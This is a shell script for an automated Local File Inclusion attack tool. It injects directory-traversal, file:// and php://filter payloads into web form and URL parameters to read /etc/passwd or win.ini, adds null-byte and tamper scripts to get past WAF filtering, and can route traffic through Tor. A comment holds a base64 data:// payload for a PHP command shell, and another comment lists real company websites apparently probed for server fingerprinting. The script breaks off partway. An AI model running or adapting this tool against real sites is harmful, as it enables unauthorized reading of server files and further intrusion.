#!/bin/sh

# *********************************
# * 2022/06/24 Developed by BTtea *
# *********************************


function Logo(){
    echo " _     _   _             _      ______ _____"
    echo "| |   | | | |           | |    |  ____|_   _|"
    echo "| |__ | |_| |_ ___  __ _| |    | |__    | |"
    echo "| '_ \| __| __/ _ \/ _\` | |    |  __|   | |  $1"
    echo "| |_) | |_| ||  __/ (_| | |____| |     _| |_"
    echo "|_.__/ \__|\__\___|\__,_|______|_|    |_____|"
	echo ""
}


function MenuHelp(){
    echo "Usage: bash $0 [options...]"
    echo ""
    echo "Options:"
	echo "  -h, --help               View help"
	echo "  -u, --url <URL>          Website address"
	echo "  -d, --data               HTTP/HTTPS POST data"
    echo "  --cookie <Cookies>       Send cookies from string"
    echo "  --skip <SkipParameter>   Skip testing for given parameter(s)"
    echo "  -p <TESTParameter>       Testable parameter(s)"
	echo "  -v                       Show debug information"
    echo "  --color                  Display color mode"
    echo "  --tor <IP:Port>          Use Tor anonymity network"
    echo "  --tamper <TAMPER(S)>     Use given script(s) for tampering injection data"
    echo "  --flush-session          Flush session files for current target"
    echo "  --suffix <SUFFIX>        Injection payload suffix string"
    echo "  --prefix <PREFIX>        Injection payload prefix string"
    echo "  --move <Number>          The depth of the movement path, defaults to 10"
    echo "  --os <os>                Specify system type"
    echo ""
}


function SettingColor(){
    ERROR_RED="\e[38;05;9m"
    WARNING_YELLOW="\e[38;05;3m"
    INFO_GREEN="\e[38;05;34m"
    TIME_LightBlue="\e[38;05;75m"
    PAYLOAD_LightBlue="\e[38;05;75m"
    DEBUG_NavyBlue="\e[38;05;4m"
    CRITICAL_BACKGROUND_RED="\e[41m"
    BOLD_FONT="\e[1m"
    END_COLOR="\e[0m"
}



function NOWTIME(){
    echo -e "${TIME_LightBlue}$(date "+%T")${END_COLOR}"
}


function ReadHistory(){
    local LogFile=$1
    local Variable=$2
    local GetWorkDir=`dirname $0`

    if [ "$3" != "" ];then
        [ -f "$GetWorkDir/report/$LogFile/$Variable.txt" ] && cat $GetWorkDir/report/$LogFile/$Variable.txt && return 1
    else
        if [ -d "$GetWorkDir/report/$LogFile" ];then
            for DisplayHistory in `ls $GetWorkDir/report/$LogFile`;do
                cat $GetWorkDir/report/$LogFile/$DisplayHistory
            done
            return 1
        fi
    fi
    return 0
}


function LFIscan(){
    local WebsiteDNS="$1"
    local WebPathAddress="$2"
    local GetData="$3"
    local PostData="$4"

    # test target
    echo -e "[$(NOWTIME)] [${INFO_GREEN}INFO${END_COLOR}] testing connection to the target URL"
    local WebStatusCode=`curl $socks5Link -L "$WebPathAddress?$GetData" $CurlPostParameter $PostData $CurlCookieParameter $Cookies -o /dev/null -w %{http_code} -s`
    [ "$Debug" = "True" ] && echo -e "[$(NOWTIME)] [${DEBUG_NavyBlue}DEBUG${END_COLOR}] $WebPathAddress status code : $WebStatusCode"
    [ "$WebStatusCode" != "200" ] && echo -e "[$(NOWTIME)] [${WARNING_YELLOW}WARNING${END_COLOR}] the site cannot connect properly."

    # Decomposition parameters (POST)
    local PostAllParameters=(${PostData//\&/ })
    # Decomposition parameters (GET)
    local GetAllParameters=(${GetData//\&/ })

    local PostParameterIndex=""
    local GetParameterIndex=""

    local Variable=""
    local Value=""
    local temp=""
    local flag="False"
    local PayloadTemp=""
    local BeforeBodyLength=""
    local AfterBodyLength=""
    local Result=""


    # Check OS
    if [ "$OS" = "" ];then
        OS=`CheckOSSystem "$WebPathAddress"`
        [ "$OS" = "" ] && OS="Unable to detect backend technology"
    fi

    # Save find payload
    FindPayload=""

    if [ "$PostData" != "" ];then
        FindPayload=""
        for PostParameterIndex in ${PostAllParameters[@]};do

            [ "$FindPayload" != "" ] && break

            temp=(${PostParameterIndex/\=/ })
            Variable=${temp[0]}
            Value="./${temp[1]}"

            # tamper bypass script
            if [ "$TamperScript" != "" ];then
                for Script in ${TamperScript//\,/ };do
                    Value=`bash tamper/$Script.sh $Value`
                done
            fi

            temp=${PostData/$PostParameterIndex/$Variable\=$Value}

            for i in `ls report/$WebsiteDNS`;do cat report/$WebsiteDNS/$i;done

            # skip the specified parameter
            if [ "$SkipParameter" != "" ];then
                for _skip_ in $SkipParameter;do
                    [ "$_skip_" = "$Variable" ] && flag="True" && break
                done
                [ "$flag" = "True" ] && flag="False" && continue
            fi

            # find the specified parameter
            if [ "$SpecifyParameter" != "" ];then
                for specified in $SpecifyParameter;do
                    [ "$specified" = "$Variable" ] && flag="True" && break
                done
                [ "$flag" != "True" ] && continue
                flag="False"
            fi

            # Search injection history
            ReadHistory "$WebsiteDNS" "$Variable" "$SpecifyParameter"
            [ $? -eq 1 ] && return

            echo -e "[$(NOWTIME)] [${INFO_GREEN}INFO${END_COLOR}] Test if parameter \"$Variable\" is exist LFI"

            GetBeforeBodyLength=`curl $socks5Link -i "$WebPathAddress?$GetData" $CurlPostParameter $PostData $CurlCookieParameter $Cookies -s|grep "Content-Length:"`
            GetAfterBodyLength=`curl $socks5Link -i "$WebPathAddress?$GetData" $CurlPostParameter $temp $CurlCookieParameter $Cookies -s|grep "Content-Length:"`
            
            [ "$Debug" = "True" ] && echo -e "[$(NOWTIME)] [${PAYLOAD_LightBlue}PAYLOAD${END_COLOR}] $temp"
            ([ "$GetBeforeBodyLength" = "$GetAfterBodyLength" ] && echo -e "[$(NOWTIME)] [${INFO_GREEN}INFO${END_COLOR}] Parameter \"$Variable\" LFI vulnerability may exist") || echo -e "[$(NOWTIME)] [${WARNING_YELLOW}WARNING${END_COLOR}] Parameter \"$Variable\" LFI vulnerability may not exist"


            if [ "$OS" = "linux" ];then

                echo -e "[$(NOWTIME)] ${BOLD_FONT}[${INFO_GREEN}INFO${END_COLOR}${BOLD_FONT}] target server system detected as \"Linux\"${END_COLOR}"

                # Scan
                TryInjection "Scan" "/etc/passwd" "root:x:0:0:root:/root:/bin/bash" "$WebPathAddress" "$GetData" "$PostData" "$PostParameterIndex" "$Variable"
                # Move
                TryInjection "MoveAddress" "/etc/passwd" "root:x:0:0:root:/root:/bin/bash" "$WebPathAddress" "$GetData" "$PostData" "$PostParameterIndex" "$Variable"
                # file:///etc/passwd
                TryInjection "file://" "/etc/passwd" "root:x:0:0:root:/root:/bin/bash" "$WebPathAddress" "$GetData" "$PostData" "$PostParameterIndex" "$Variable"
                # php://filter/resource=/etc/passwd
                TryInjection "php://filter" "/etc/passwd" "root:x:0:0:root:/root:/bin/bash" "$WebPathAddress" "$GetData" "$PostData" "$PostParameterIndex" "$Variable"

                # php://input

                # data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NdKTsgPz4K=cat%20/etc/passwd
                # PD9waHAgc3lzdGVtKCRfR0VUW2NdKTsgPz4K => <?php system($_GET[c]); ?>
                # 轉址

                [ "$FindPayload" != "" ] && OS="linux"


            elif [ "$OS" = "windows" ];then

                echo -e "[$(NOWTIME)] ${BOLD_FONT}[${INFO_GREEN}INFO${END_COLOR}${BOLD_FONT}] target server system detected as \"Windows\"${END_COLOR}"

                # Scan
                TryInjection "Scan" "C:\\Windows\\win.ini" "\[extensions\]" "$WebPathAddress" "$GetData" "$PostData" "$GetParameterIndex" "$PostParameterIndex" "$Variable"
                # Move
                TryInjection "MoveAddress" "C:\\Windows\\win.ini" "\[extensions\]" "$WebPathAddress" "$GetData" "$PostData" "$GetParameterIndex" "$PostParameterIndex" "$Variable"
                # file://C:\Windows\win.ini
                TryInjection "file://" "C:\\Windows\\win.ini" "\[extensions\]" "$WebPathAddress" "$GetData" "$PostData" "$GetParameterIndex" "$PostParameterIndex" "$Variable"
                
                TryInjection "php://filter" "C:\\Windows\\win.ini" "\[extensions\]" "$WebPathAddress" "$GetData" "$PostData" "$GetParameterIndex" "$PostParameterIndex" "$Variable"


                [ "$FindPayload" != "" ] && OS="windows"

            else
                echo -e "[$(NOWTIME)] [${WARNING_YELLOW}WARNING${END_COLOR}] unable to determine target system service, you can use the \"--os\" parameter to specify the target operating system."
                
                [ "$Debug" = "True" ] && echo -e "[$(NOWTIME)] [${DEBUG_NavyBlue}DEBUG${END_COLOR}] $OS"

                echo -e "[$(NOWTIME)] [${INFO_GREEN}INFO${END_COLOR}] try to guess the operating system directory"
                # Scan
                TryInjection "Scan" "/etc/passwd" "root:x:0:0:root:/root:/bin/bash" "$WebPathAddress" "$GetData" "$PostData" "$GetParameterIndex" "$PostParameterIndex" "$Variable"
                # Move
                TryInjection "MoveAddress" "/etc/passwd" "root:x:0:0:root:/root:/bin/bash" "$WebPathAddress" "$GetData" "$PostData" "$GetParameterIndex" "$PostParameterIndex" "$Variable"
                # file:///etc/passwd
                TryInjection "file://" "/etc/passwd" "root:x:0:0:root:/root:/bin/bash" "$WebPathAddress" "$GetData" "$PostData" "$GetParameterIndex" "$PostParameterIndex" "$Variable"
                # php://filter/resource=/etc/passwd
                TryInjection "php://filter" "/etc/passwd" "root:x:0:0:root:/root:/bin/bash" "$WebPathAddress" "$GetData" "$PostData" "$GetParameterIndex" "$PostParameterIndex" "$Variable"

                if [ "$FindPayload" != "" ];then
                    OS="linux"
                else
                    # Scan
                    TryInjection "Scan" "C:\\Windows\\win.ini" "\[extensions\]" "$WebPathAddress" "$GetData" "$PostData"  "$GetParameterIndex""$PostParameterIndex" "$Variable"
                    # Move
                    TryInjection "MoveAddress" "C:\\Windows\\win.ini" "\[extensions\]" "$WebPathAddress" "$GetData" "$PostData"  "$GetParameterIndex""$PostParameterIndex" "$Variable"
                    # file://C:\Windows\win.ini
                    TryInjection "file://" "C:\\Windows\\win.ini" "\[extensions\]" "$WebPathAddress" "$GetData" "$PostData"  "$GetParameterIndex""$PostParameterIndex" "$Variable"
                    
                    TryInjection "php://filter" "C:\\Windows\\win.ini" "\[extensions\]" "$WebPathAddress" "$GetData" "$PostData" "$GetParameterIndex" "$PostParameterIndex" "$Variable"
                
                    [ "$FindPayload" != "" ] && OS="windows"
                fi
            fi


            if [ "$FindPayload" != "" ];then
                SavefoundPayload "$WebsiteDNS" "$Variable" "POST" "$OS"
                cat `dirname $0`/report/$WebsiteDNS/$Variable.txt
                break
            else
                echo -e "[$(NOWTIME)] [${WARNING_YELLOW}WARNING${END_COLOR}] the parameter \"$Variable\" can't be injection."
            fi

        done
    fi



    if [ "$GetData" != "" ];then
        FindPayload=""
        for GetParameterIndex in ${GetAllParameters[@]};do

            [ "$FindPayload" != "" ] && break

            temp=(${GetParameterIndex/\=/ })
            Variable=${temp[0]}

            Value="./${temp[1]}"

            # tamper bypass script
            if [ "$TamperScript" != "" ];then
                for Script in ${TamperScript//\,/ };do
                    Value=`bash tamper/$Script.sh $Value`
                done
            fi
            
            temp=${GetData/$GetParameterIndex/$Variable\=$Value}

            # skip the specified parameter
            if [ "$SkipParameter" != "" ];then
                for _skip_ in $SkipParameter;do
                    [ "$_skip_" = "$Variable" ] && flag="True" && break
                done
                [ "$flag" = "True" ] && flag="False" && continue
            fi

            # find the specified parameter
            if [ "$SpecifyParameter" != "" ];then
                for specified in $SpecifyParameter;do
                    [ "$specified" = "$Variable" ] && flag="True" && break
                done
                [ "$flag" != "True" ] && continue
                flag="False"
            fi

            # Search injection history
            ReadHistory "$WebsiteDNS" "$Variable" "$SpecifyParameter"
            [ $? -eq 1 ] && return

            echo -e "[$(NOWTIME)] [${INFO_GREEN}INFO${END_COLOR}] test if parameter \"$Variable\" is exist LFI"

            GetBeforeBodyLength=`curl $socks5Link -i "$WebPathAddress?$GetData" $CurlPostParameter $PostData $CurlCookieParameter $Cookies -s|grep "Content-Length:"`
            GetAfterBodyLength=`curl $socks5Link -i "$WebPathAddress?$temp" $CurlPostParameter $PostData $CurlCookieParameter $Cookies -s|grep "Content-Length:"`

            [ "$Debug" = "True" ] && echo -e "[$(NOWTIME)] [${PAYLOAD_LightBlue}PAYLOAD${END_COLOR}] $temp"
            ([ "$GetBeforeBodyLength" = "$GetAfterBodyLength" ] && echo -e "[$(NOWTIME)] [${INFO_GREEN}INFO${END_COLOR}] Parameter \"$Variable\" LFI vulnerability may exist") || echo -e "[$(NOWTIME)] [${WARNING_YELLOW}WARNING${END_COLOR}] Parameter \"$Variable\" LFI vulnerability may not exist"

            
            if [ "$OS" = "linux" ];then

                echo -e "[$(NOWTIME)] ${BOLD_FONT}[${INFO_GREEN}INFO${END_COLOR}${BOLD_FONT}] target server system detected as \"Linux\"${END_COLOR}"

                # Scan
                TryInjection "Scan" "/etc/passwd" "root:x:0:0:root:/root:/bin/bash" "$WebPathAddress" "$GetData" "$PostData" "$GetParameterIndex" "$PostParameterIndex" "$Variable"
                # Move
                TryInjection "MoveAddress" "/etc/passwd" "root:x:0:0:root:/root:/bin/bash" "$WebPathAddress" "$GetData" "$PostData" "$GetParameterIndex" "$PostParameterIndex" "$Variable"
                # file:///etc/passwd
                TryInjection "file://" "/etc/passwd" "root:x:0:0:root:/root:/bin/bash" "$WebPathAddress" "$GetData" "$PostData" "$GetParameterIndex" "$PostParameterIndex" "$Variable"
                # php://filter/resource=/etc/passwd
                TryInjection "php://filter" "/etc/passwd" "root:x:0:0:root:/root:/bin/bash" "$WebPathAddress" "$GetData" "$PostData" "$GetParameterIndex" "$PostParameterIndex" "$Variable"

                # php://input

                # data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NdKTsgPz4K=cat%20/etc/passwd
                # PD9waHAgc3lzdGVtKCRfR0VUW2NdKTsgPz4K => <?php system($_GET[c]); ?>
                # 轉址

                [ "$FindPayload" != "" ] && OS="linux"


            elif [ "$OS" = "windows" ];then

                echo -e "[$(NOWTIME)] ${BOLD_FONT}[${INFO_GREEN}INFO${END_COLOR}${BOLD_FONT}] target server system detected as \"Windows\"${END_COLOR}"

                # Scan
                TryInjection "Scan" "C:\\Windows\\win.ini" "\[extensions\]" "$WebPathAddress" "$GetData" "$PostData" "$GetParameterIndex" "$PostParameterIndex" "$Variable"
                # Move
                TryInjection "MoveAddress" "C:\\Windows\\win.ini" "\[extensions\]" "$WebPathAddress" "$GetData" "$PostData" "$GetParameterIndex" "$PostParameterIndex" "$Variable"
                # file://C:\Windows\win.ini
                TryInjection "file://" "C:\\Windows\\win.ini" "\[extensions\]" "$WebPathAddress" "$GetData" "$PostData" "$GetParameterIndex" "$PostParameterIndex" "$Variable"
                
                TryInjection "php://filter" "C:\\Windows\\win.ini" "\[extensions\]" "$WebPathAddress" "$GetData" "$PostData" "$GetParameterIndex" "$PostParameterIndex" "$Variable"


                [ "$FindPayload" != "" ] && OS="windows"

            else
                echo -e "[$(NOWTIME)] [${WARNING_YELLOW}WARNING${END_COLOR}] unable to determine target system service, you can use the \"--os\" parameter to specify the target operating system."
                
                [ "$Debug" = "True" ] && echo -e "[$(NOWTIME)] [${DEBUG_NavyBlue}DEBUG${END_COLOR}] $OS"

                echo -e "[$(NOWTIME)] [${INFO_GREEN}INFO${END_COLOR}] try to guess the operating system directory"
                # Scan
                TryInjection "Scan" "/etc/passwd" "root:x:0:0:root:/root:/bin/bash" "$WebPathAddress" "$GetData" "$PostData" "$GetParameterIndex" "$PostParameterIndex" "$Variable"
                # Move
                TryInjection "MoveAddress" "/etc/passwd" "root:x:0:0:root:/root:/bin/bash" "$WebPathAddress" "$GetData" "$PostData" "$GetParameterIndex" "$PostParameterIndex" "$Variable"
                # file:///etc/passwd
                TryInjection "file://" "/etc/passwd" "root:x:0:0:root:/root:/bin/bash" "$WebPathAddress" "$GetData" "$PostData" "$GetParameterIndex" "$PostParameterIndex" "$Variable"
                # php://filter/resource=/etc/passwd
                TryInjection "php://filter" "/etc/passwd" "root:x:0:0:root:/root:/bin/bash" "$WebPathAddress" "$GetData" "$PostData" "$GetParameterIndex" "$PostParameterIndex" "$Variable"

                if [ "$FindPayload" != "" ];then
                    OS="linux"
                else
                    # Scan
                    TryInjection "Scan" "C:\\Windows\\win.ini" "\[extensions\]" "$WebPathAddress" "$GetData" "$PostData" "$GetParameterIndex" "$PostParameterIndex" "$Variable"
                    # Move
                    TryInjection "MoveAddress" "C:\\Windows\\win.ini" "\[extensions\]" "$WebPathAddress" "$GetData" "$PostData" "$GetParameterIndex" "$PostParameterIndex" "$Variable"
                    # file://C:\Windows\win.ini
                    TryInjection "file://" "C:\\Windows\\win.ini" "\[extensions\]" "$WebPathAddress" "$GetData" "$PostData" "$GetParameterIndex" "$PostParameterIndex" "$Variable"
                    
                    TryInjection "php://filter" "C:\\Windows\\win.ini" "\[extensions\]" "$WebPathAddress" "$GetData" "$PostData" "$GetParameterIndex" "$PostParameterIndex" "$Variable"
                
                    [ "$FindPayload" != "" ] && OS="windows"
                fi
            fi

            if [ "$FindPayload" != "" ];then
                SavefoundPayload "$WebsiteDNS" "$Variable" "GET" "$OS"
                cat `dirname $0`/report/$WebsiteDNS/$Variable.txt
                break
            else
                echo -e "[$(NOWTIME)] [${WARNING_YELLOW}WARNING${END_COLOR}] the parameter \"$Variable\" can't be injection."
            fi
        done
    fi

    if [ "$FindPayload" = "" ];then
        if [ "$TamperScript" = "" ];then
            echo -e "[$(NOWTIME)] [${CRITICAL_BACKGROUND_RED}CRITICAL${END_COLOR}] all tested parameters do not appear to be injectable. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option \"--tamper\" (e.g. \"--tamper filter\")."
        else
            echo -e "[$(NOWTIME)] [${CRITICAL_BACKGROUND_RED}CRITICAL${END_COLOR}] all tested parameters do not appear to be injectable."
        fi
    fi
}


function SavefoundPayload(){

    local WebsiteDNS=$1
    local Variable=$2
    local Method=$3
    local WorkingSystem=$4

    [ ! -d "`dirname $0`/report/$WebsiteDNS" ] && mkdir `dirname $0`/report/$WebsiteDNS

    # show answer
    echo "---" >> `dirname $0`/report/$WebsiteDNS/$Variable.txt
    echo "Working System : $WorkingSystem" >> `dirname $0`/report/$WebsiteDNS/$Variable.txt
    echo "Parameter: $Variable ($Method)" >> `dirname $0`/report/$WebsiteDNS/$Variable.txt

    for ShowPayload in ${FindPayload};do
        echo "    Payload: $ShowPayload" >> `dirname $0`/report/$WebsiteDNS/$Variable.txt
    done

    echo "---" >> `dirname $0`/report/$WebsiteDNS/$Variable.txt
    return
}


function TryInjection(){
    # payload injection start
    local InjectionType=$1
    local Payload=$2
    local Target=$3
    local WebPathAddress=$4
    local GetData=$5
    local PostData=$6
    local GetParameterIndex=$7
    local PostParameterIndex=$8
    local Variable=$9

    local Move=""

    # Save bypass test Character
    [ "$SuffixBypassCharacter" != "" ] && local BypassCharacter=("$SuffixBypassCharacter") || local BypassCharacter=("[void]" "%00" "\0")

    if [ "$InjectionType" = "Scan" ];then

        for TryBypass in ${BypassCharacter[@]};do

            # tamper bypass script
            local PayloadTemp=$PrefixBypassCharacter$Payload`[ "$TryBypass" = "[void]" ] && echo "" || echo "$TryBypass"`
            if [ "$TamperScript" != "" ];then
                for Script in ${TamperScript//\,/ };do
                    PayloadTemp=`bash tamper/$Script.sh $PayloadTemp`
                done
            fi

            [ "$Debug" = "True" ] && echo -n -e "[$(NOWTIME)] [${PAYLOAD_LightBlue}PAYLOAD${END_COLOR}]" && echo " $Variable=$PayloadTemp"

            # inejction payload
            local Result=`curl $Socks5Link -i "$WebPathAddress?${GetData//$GetParameterIndex/$Variable\=$PayloadTemp}" $CurlPostParameter ${PostData/$PostParameterIndex/$Variable\=$PayloadTemp} $CurlCookieParameter $Cookies -s | grep "$Target"`

            # if find, show message
            if [ "$Result" != "" ];then
                echo -e "[$(NOWTIME)] ${BOLD_FONT}[${INFO_GREEN}INFO${END_COLOR}${BOLD_FONT}] payload $Payload LFI find.${END_COLOR}"
                FindPayload="$FindPayload $Variable=$PayloadTemp"

                SuffixBypassCharacter=`[ "$TryBypass" = "" ] && echo "[void]" || echo "$TryBypass"`
            fi
        done
    


    elif [ "$InjectionType" = "MoveAddress" ];then
        
        echo -e "[$(NOWTIME)] [${INFO_GREEN}INFO${END_COLOR}] testing try moving directory"

        local PayloadTemp=${Payload/\//}

        for TryBypass in ${BypassCharacter[@]};do

            Move="../"
            
            for ((MoveRound=1; MoveRound<=$MoveCount; MoveRound++));do

                local PayloadTemp="$PrefixBypassCharacter$Move${Payload/\//}`[ "$TryBypass" = "[void]" ] && echo "" || echo "$TryBypass"`"

                # tamper bypass script
                if [ "$TamperScript" != "" ];then
                    for Script in ${TamperScript//\,/ };do
                        PayloadTemp=`bash tamper/$Script.sh $PayloadTemp`
                    done
                fi
                
                [ "$Debug" = "True" ] && echo -n -e "[$(NOWTIME)] [${PAYLOAD_LightBlue}PAYLOAD${END_COLOR}]" && echo " $Variable=$PayloadTemp"

                # inejction payload
                local Result=`curl $Socks5Link -i "$WebPathAddress?${GetData//$GetParameterIndex/$Variable\=$PayloadTemp}" $CurlPostParameter ${PostData/$PostParameterIndex/$Variable\=$PayloadTemp} $CurlCookieParameter $Cookies -s | grep "$Target"`
                
                # if find, show message
                if [ "$Result" != "" ];then
                    PathMoveHistory=$Move
                    echo -e "[$(NOWTIME)] ${BOLD_FONT}[${INFO_GREEN}INFO${END_COLOR}${BOLD_FONT}] payload $PayloadTemp LFI find.${END_COLOR}"
                    FindPayload="$FindPayload $Variable=$PayloadTemp"

                    SuffixBypassCharacter=`([ "$TryBypass" = "" ] && echo "[void]") || echo "$TryBypass"`
                    break
                fi

                Move="../$Move"
                
            done
        done



    elif [ "$InjectionType" = "file://" ];then

        echo -e "[$(NOWTIME)] [${INFO_GREEN}INFO${END_COLOR}] testing \"file://\" pseudo-protocol"

        for TryBypass in ${BypassCharacter[@]};do

            # tamper bypass script
            local PayloadTemp="file://$Payload`([ "$TryBypass" = "[void]" ] && echo "") || echo "$TryBypass"`"
            if [ "$TamperScript" != "" ];then
                for Script in ${TamperScript//\,/ };do
                    PayloadTemp=`bash tamper/$Script.sh $PayloadTemp`
                done
            fi
            
            [ "$Debug" = "True" ] && echo -n -e "[$(NOWTIME)] [${PAYLOAD_LightBlue}PAYLOAD${END_COLOR}]" && echo " $Variable=$PayloadTemp"

            # inejction payload
            local Result=`curl $Socks5Link -i "$WebPathAddress?${GetData//$GetParameterIndex/$Variable\=$PayloadTemp}" $CurlPostParameter ${PostData/$PostParameterIndex/$Variable\=$PayloadTemp} $CurlCookieParameter $Cookies -s | grep "$Target"`
            
            # if find, show message
            if [ "$Result" != "" ];then
                echo -e "[$(NOWTIME)] ${BOLD_FONT}[${INFO_GREEN}INFO${END_COLOR}${BOLD_FONT}] payload file://$Payload LFI find.${END_COLOR}"
                FindPayload="$FindPayload $Variable=$PayloadTemp"

                SuffixBypassCharacter=`([ "$TryBypass" = "" ] && echo "[void]") || echo "$TryBypass"`
            fi
        done
    


    elif [ "$InjectionType" = "php://filter" ];then

        echo -e "[$(NOWTIME)] [${INFO_GREEN}INFO${END_COLOR}] testing \"php://filter\" pseudo-protocol"

        local PayloadTemp=${Payload/\//}

        for TryBypass in ${BypassCharacter[@]};do
            # if not found Move address
            if [ "$PathMoveHistory" = "" ];then

                for ((MoveRound=0; MoveRound<=$MoveCount; MoveRound++));do

                    [ $MoveRound -eq 0 ] && Move="/"

                    local PayloadTemp="php://filter/resource=$Move${Payload/\//}`([ "$TryBypass" = "[void]" ] && echo "") || echo "$TryBypass"`"

                    # tamper bypass script
                    if [ "$TamperScript" != "" ];then
                        for Script in ${TamperScript//\,/ };do
                            PayloadTemp=`bash tamper/$Script.sh $PayloadTemp`
                        done
                    fi
                    
                    [ "$Debug" = "True" ] && echo -n -e "[$(NOWTIME)] [${PAYLOAD_LightBlue}PAYLOAD${END_COLOR}]" && echo " $Variable=$PayloadTemp"

                    # inejction payload
                    local Result=`curl $Socks5Link -i "$WebPathAddress?${GetData//$GetParameterIndex/$Variable\=$PayloadTemp}" $CurlPostParameter ${PostData/$PostParameterIndex/$Variable\=$PayloadTemp} $CurlCookieParameter $Cookies -s | grep "$Target"`
                    
                    # if find, show message
                    if [ "$Result" != "" ];then
                        echo -e "[$(NOWTIME)] ${BOLD_FONT}[${INFO_GREEN}INFO${END_COLOR}${BOLD_FONT}] payload $PayloadTemp LFI find.${END_COLOR}"
                        FindPayload="$FindPayload $Variable=$PayloadTemp"

                        SuffixBypassCharacter=`([ "$TryBypass" = "" ] && echo "[void]") || echo "$TryBypass"`
                        break
                    fi

                    Move="../$Move"

                    [ $MoveRound -eq 0 ] && Move="../"
                    
                done
            else
                for TryBypass in ${BypassCharacter[@]};do

                    # tamper bypass script
                    local PayloadTemp="php://filter/resource=$PathMoveHistory$PayloadTemp`([ "$TryBypass" = "[void]" ] && echo "") || echo "$TryBypass"`"
                    if [ "$TamperScript" != "" ];then
                        for Script in ${TamperScript//\,/ };do
                            PayloadTemp=`bash tamper/$Script.sh $PayloadTemp`
                        done
                    fi
                    
                    [ "$Debug" = "True" ] && echo -n -e "[$(NOWTIME)] [${PAYLOAD_LightBlue}PAYLOAD${END_COLOR}]" && echo " $Variable=$PayloadTemp"

                    # inejction payload
                    local Result=`curl $Socks5Link -i "$WebPathAddress?${GetData//$GetParameterIndex/$Variable\=$PayloadTemp}" $CurlPostParameter ${PostData/$PostParameterIndex/$Variable\=$PayloadTemp} $CurlCookieParameter $Cookies -s | grep "$Target"`
                    
                    # if find, show message
                    if [ "$Result" != "" ];then
                        echo -e "[$(NOWTIME)] ${BOLD_FONT}[${INFO_GREEN}INFO${END_COLOR}${BOLD_FONT}] payload $PayloadTemp LFI find.${END_COLOR}"
                        FindPayload="$FindPayload $Variable=$PayloadTemp"

                        SuffixBypassCharacter=`([ "$TryBypass" = "" ] && echo "[void]") || echo "$TryBypass"`
                    fi
                done
            fi
        done


    fi
}



function CheckOSSystem(){
    local Web="$1"
    local WebDataResult=`curl $socks5Link -k -s -I -X TRACE "$Web"|grep -i "server:"`
    local Result=""
    
    [ "`echo $WebDataResult|grep -i \"(Win64)\"`" != "" ] && Result="windows"
    [ "`echo $WebDataResult|grep -i \"Microsoft-IIS\"`" != "" ] && Result="windows"
    [ "`echo $WebDataResult|grep -i \"(Ubuntu)\"`" != "" ] && Result="linux"
    [ "`echo $WebDataResult|grep -i \"(Unix)\"`" != "" ] && Result="linux"
    [ "`echo $WebDataResult|grep -i \"(CentOS)\"`" != "" ] && Result="linux"
    [ "$Result" = "" ] && echo "$WebDataResult" || echo "$Result"
    return

    # curl -k -s -I  -X TRACE http://192.168.0.15/paper/home.php
    # https://www.allring-tech.com.tw/ win64
    # https://www.newmax.com.tw/ unix
    # http://www.sanshing.com.tw/ centos
    # https://www.pmi-amt.com/ ubuntu
    # https://www.chinalab.com.tw/ Microsoft-IIS
    # https://www.tbimotion.com.tw/ cloudflare
}



function main(){
    local version="v1.0.0"
    local ParametersStatus=""
    local WebsiteUrl=""
    local PostData=""
    local DeleteHistory="False"
    local flag="False"
    
    Debug="False"
    Cookies=""
    CurlCookieParameter=""
    #AutoChooseMode="False"
    Socks5Link=""
    TamperScript=""
    SkipParameter=""
    SpecifyParameter=""
    CurlPostParameter=""
    SuffixBypassCharacter=""
    PrefixBypassCharacter=""
    MoveCount=10
    OS=""

    Logo $version

    # if not have curl, show this message
    curl --version>/dev/null 2>&1
    [ $? -ne 0 ] && echo "Environment does not support \"curl\" command." && exit

    # if not have nc, show this message
    nc>/dev/null 2>&1
    [ $? -ne 1 ] && echo "Environment does not support \"nc\" command." && exit

    # if no argc parameter(s), call help function
    [ $# -eq 0 ] && MenuHelp && exit

    

    for i in $@;do
        [ "$i" = "" ] && break
        ([ "$i" = "-h" ] || [ "$i" = "--help" ]) && MenuHelp && exit
        ([ "$i" = "-u" ] || [ "$i" = "--url" ]) && ParametersStatus="--url" && continue
        ([ "$i" = "-d" ] || [ "$i" = "--data" ]) && ParametersStatus="--data" && continue
        [ "$i" = "--cookie" ] && ParametersStatus="--cookie" && continue
        [ "$i" = "--skip" ] && ParametersStatus="--skip" && continue
        [ "$i" = "-p" ] && ParametersStatus="-p" && continue
        [ "$i" = "--tor" ] && ParametersStatus="--tor" && continue
        [ "$i" = "--tamper" ] && ParametersStatus="--tamper" && continue
        [ "$i" = "--color" ] && SettingColor && continue
        #[ "$i" = "--batch" ] && AutoChooseMode="True" && continue
        [ "$i" = "-v" ] && Debug="True" && continue
        [ "$i" = "--flush-session" ] && DeleteHistory="True" && continue
        [ "$i" = "--suffix" ] && ParametersStatus="--suffix" && continue
        [ "$i" = "--prefix" ] && ParametersStatus="--prefix" && continue
        [ "$i" = "--move" ] && ParametersStatus="--move" && continue
        [ "$i" = "--os" ] && ParametersStatus="--os" && continue
        
        [ "$ParametersStatus" = "--url" ] && WebsiteUrl="$i" && ParametersStatus="" && continue
        [ "$ParametersStatus" = "--data" ] && PostData="$i" && CurlPostParameter="--data" && ParametersStatus="" && continue
        [ "$ParametersStatus" = "--cookie" ] && Cookies="$i" && CurlCookieParameter="--cookie" && ParametersStatus="" && continue
        [ "$ParametersStatus" = "--tor" ] && Socks5Link="--socks5-hostname $i" && ParametersStatus="" && continue
        [ "$ParametersStatus" = "--tamper" ] && TamperScript="$i" && ParametersStatus="" && continue
        [ "$ParametersStatus" = "--skip" ] && SkipParameter="${i//\,/ }" && ParametersStatus="" && continue
        [ "$ParametersStatus" = "-p" ] && SpecifyParameter="${i//\,/ }" && ParametersStatus="" && continue
        [ "$ParametersStatus" = "--suffix" ] && SuffixBypassCharacter="$i" && ParametersStatus="" && continue
        [ "$ParametersStatus" = "--prefix" ] && PrefixBypassCharacter="$i" && ParametersStatus="" && continue
        [ "$ParametersStatus" = "--move" ] && MoveCount="$i" && ParametersStatus="" && continue
        [ "$ParametersStatus" = "--os" ] && OS="$i" && ParametersStatus="" && continue

        echo -e "[$(NOWTIME)] [${ERROR_RED}ERROR${END_COLOR}] \"$i\" Incorrect parameter settings, please refer to \"--help\" for usage." && exit
    done

    local temp=(${Socks5Link// / })
    if [ "$Socks5Link" != "" ];then
